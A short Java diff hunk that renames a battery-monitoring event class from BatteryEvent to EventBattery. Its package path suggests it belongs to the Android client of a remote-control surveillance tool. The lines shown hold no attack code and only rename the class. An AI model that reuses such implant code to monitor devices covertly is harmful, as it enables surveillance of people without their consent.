@@ -11,9 +11,9 @@ import com.ht.RCSAndroidGUI.listener.ListenerAc;
 import com.ht.RCSAndroidGUI.listener.ListenerBattery;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
-public class BatteryEvent extends EventBase implements Observer<Battery> {
+public class EventBattery extends EventBase implements Observer<Battery> {
 	/** The Constant TAG. */
-	private static final String TAG = "BatteryEvent";
+	private static final String TAG = "EventBattery";
 
 	private int actionOnExit, actionOnEnter, minLevel, maxLevel;
 	private boolean inRange = false;
